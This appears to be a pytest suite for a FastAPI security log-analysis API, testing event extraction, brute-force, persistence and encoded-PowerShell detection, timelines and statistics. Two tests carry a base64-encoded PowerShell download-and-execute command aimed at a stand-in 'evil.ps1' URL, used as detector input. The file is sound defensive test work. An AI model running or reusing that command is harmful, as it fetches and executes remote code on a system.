import os
import tempfile

import pytest
from fastapi.testclient import TestClient

from src.api import app
from src.database import get_db, init_db

client = TestClient(app)


@pytest.fixture(autouse=True)
def setup(monkeypatch):
    tmp_db = tempfile.mktemp(suffix=".db")
    monkeypatch.setattr("src.config.settings.database_path", tmp_db)
    monkeypatch.setattr("src.config.settings.uploads_dir", tempfile.mkdtemp())
    init_db()
    client.post("/api/v1/auth/register", json={"username": "analyst", "email": "a@a.com", "password": "pass"})
    yield
    try:
        os.remove(tmp_db)
    except OSError:
        pass


def _auth():
    r = client.post("/api/v1/auth/login", json={"username": "analyst", "password": "pass"})
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def _upload(content: str, filename: str = "test.log"):
    r = client.post("/api/v1/logs/upload", files={"file": (filename, content.encode(), "text/plain")}, headers=_auth())
    return r.json()["id"]


# ── 3.3 Event Extraction ──

def test_extract_failed_login():
    lid = _upload("Sep 26 10:00:00 server sshd[1234]: Failed password for root from 10.0.0.1 port 22")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "failed_login" in names


def test_extract_successful_login():
    lid = _upload("Sep 26 10:05:00 server sshd[5678]: Accepted password for admin from 10.0.0.2 port 22")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "successful_login" in names


def test_extract_process_creation():
    lid = _upload("Windows Event 4688: A new process has been created. Process: cmd.exe")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "process_creation" in names


def test_extract_powershell():
    lid = _upload("powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAEUAVAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQALwBlAHYAaQBsAC4AcABzADEAJwApAA==")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "powershell_execution" in names


def test_extract_network_connection():
    lid = _upload("Connection from 10.0.0.5:443 to 192.168.1.100:8080 established")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "network_connection" in names


def test_extract_service_creation():
    lid = _upload("Service installed: MaliciousService has been created by NT AUTHORITY\\SYSTEM")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    names = [e["event_name"] for e in r.json()]
    assert "service_creation" in names


# ── 3.4 Suspicious Activity Detection ──

def test_encoded_powershell_detection():
    lid = _upload('powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAEUAVAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQALwBlAHYAaQBsAC4AcABzADEAJwApAA==')
    r = client.get(f"/api/v1/logs/{lid}/suspicious", headers=_auth())
    types = [f["type"] for f in r.json()]
    assert "encoded_powershell" in types


def test_brute_force_detection():
    lines = "\n".join([
        f"Sep 26 10:00:{str(i).zfill(2)} server sshd[1234]: Failed password for root from 10.0.0.99 port 22"
        for i in range(6)
    ])
    lid = _upload(lines)
    r = client.get(f"/api/v1/logs/{lid}/suspicious?bf-threshold=5&bf-window=5", headers=_auth())
    types = [f["type"] for f in r.json()]
    assert "brute_force" in types


def test_suspicious_process_pair():
    lid = _upload("Process created: cmd.exe parent created child process: powershell.exe")
    r = client.get(f"/api/v1/logs/{lid}/suspicious", headers=_auth())
    types = [f["type"] for f in r.json()]
    assert "suspicious_process_pair" in types


def test_privilege_escalation_sudo():
    lid = _upload("sudo: pam_unix(sudo:auth): authentication failure; logname= uid=0 euid=0 tty=/dev/pts/0")
    r = client.get(f"/api/v1/logs/{lid}/suspicious", headers=_auth())
    types = [f["type"] for f in r.json()]
    assert "privilege_escalation" in types


def test_persistence_service():
    lid = _upload("Service installed: New service created - name: UpdateService, path: C:\\Windows\\system32\\malware.exe")
    r = client.get(f"/api/v1/logs/{lid}/suspicious", headers=_auth())
    types = [f["type"] for f in r.json()]
    assert "persistence" in types


# ── 3.5 Timeline ──

def test_timeline():
    lines = "\n".join([
        "Sep 26 10:00:01 server sshd[100]: Failed password for root from 1.2.3.4 port 22",
        "Sep 26 10:00:05 server sshd[100]: Accepted password for root from 1.2.3.4 port 22",
        "Sep 26 10:01:00 server su[200]: successful su for root by admin",
    ])
    lid = _upload(lines)
    r = client.get(f"/api/v1/logs/{lid}/timeline", headers=_auth())
    blocks = r.json()
    assert len(blocks) > 0
    assert blocks[0]["event_count"] > 0


def test_attack_chain():
    lines = "\n".join([
        "Sep 26 10:00:01 server sshd[100]: Failed password for root from 1.2.3.4 port 22",
        "Sep 26 10:00:05 server sshd[100]: Accepted password for root from 1.2.3.4 port 22",
        "Sep 26 10:01:00 server systemd: Service created: backdoor.service",
    ])
    lid = _upload(lines)
    r = client.get(f"/api/v1/logs/{lid}/attack-chain", headers=_auth())
    assert "Initial Access" in r.json()["attack_chain"]
    assert "Persistence" in r.json()["attack_chain"]


# ── 3.6 Statistics / Dashboard ──

def test_statistics():
    lines = "\n".join([
        "Sep 26 10:00:01 server sshd[100]: Failed password for root from 1.2.3.4 port 22",
        "Sep 26 10:00:02 server sshd[100]: Failed password for root from 5.6.7.8 port 22",
        "Sep 26 10:00:03 server sshd[100]: Accepted password for admin from 1.2.3.4 port 22",
    ])
    lid = _upload(lines)
    r = client.get(f"/api/v1/logs/{lid}/statistics", headers=_auth())
    data = r.json()
    assert data["total_events"] == 3
    assert data["failed_logins"] == 2
    assert len(data["top_ips"]) > 0


def test_global_statistics():
    _upload("Sep 26 10:00:00 server sshd[100]: Failed password for root from 1.2.3.4 port 22")
    _upload("Sep 26 10:01:00 server sshd[100]: Accepted password for admin from 5.6.7.8 port 22")
    r = client.get("/api/v1/logs/stats/global", headers=_auth())
    data = r.json()
    assert data["total_events"] == 2


# ── 3.7 API endpoints ──

def test_get_log_detail():
    lid = _upload("test event")
    r = client.get(f"/api/v1/logs/{lid}", headers=_auth())
    assert r.status_code == 200
    assert r.json()["filename"] == "test.log"


def test_get_log_detail_not_found():
    r = client.get("/api/v1/logs/99999", headers=_auth())
    assert r.status_code == 404


def test_get_events_empty_log():
    lid = _upload("")
    r = client.get(f"/api/v1/logs/{lid}/events", headers=_auth())
    assert r.status_code == 200
    assert r.json() == []


def test_extracted_no_matches():
    lid = _upload("some random benign log entry")
    r = client.get(f"/api/v1/logs/{lid}/extracted", headers=_auth())
    assert r.json() == []


def test_suspicious_no_findings():
    lid = _upload("benign informational message")
    r = client.get(f"/api/v1/logs/{lid}/suspicious", headers=_auth())
    assert r.json() == []


# ── Unit tests for services ──

def test_extract_events_unit():
    from src.services.event_extractor import extract_events
    rows = [
        {"line_number": 1, "raw": "Failed password for root from 10.0.0.1", "event_type": "", "timestamp": None, "source_ip": "10.0.0.1", "severity": "info"},
        {"line_number": 2, "raw": "Accepted password for admin", "event_type": "", "timestamp": None, "source_ip": "10.0.0.2", "severity": "info"},
    ]
    results = extract_events(rows)
    assert len(results) == 2
    assert results[0]["event_name"] == "failed_login"
    assert results[1]["event_name"] == "successful_login"


def test_detect_brute_force_unit():
    from src.services.detector import detect_brute_force
    events = [{"event_name": "failed_login", "source_ip": "1.2.3.4", "timestamp": f"Sep 26 10:00:{str(i).zfill(2)}"} for i in range(6)]
    findings = detect_brute_force(events, threshold=5, window_minutes=5)
    assert len(findings) == 1
    assert findings[0]["type"] == "brute_force"


def test_build_timeline_unit():
    from src.services.timeline import build_timeline
    events = [
        {"timestamp": "Sep 26 10:00:00", "event_name": "failed_login", "severity": "info"},
        {"timestamp": "Sep 26 10:00:00", "event_name": "successful_login", "severity": "info"},
        {"timestamp": "Sep 26 10:01:00", "event_name": "process_creation", "severity": "high"},
    ]
    timeline = build_timeline(events)
    assert len(timeline) == 2
    assert timeline[0]["event_count"] == 2
    assert timeline[1]["is_critical"] is True


def test_compute_stats_unit():
    from src.services.statistics import compute_stats
    events = [
        {"severity": "info", "event_type": "ssh", "source_ip": "1.2.3.4", "event_name": ""},
        {"severity": "error", "event_type": "ssh", "source_ip": "1.2.3.4", "event_name": "failed_login"},
    ]
    stats = compute_stats(events, [{"type": "test"}])
    assert stats["total_events"] == 2
    assert stats["suspicious_events"] == 1
    assert stats["failed_logins"] == 1
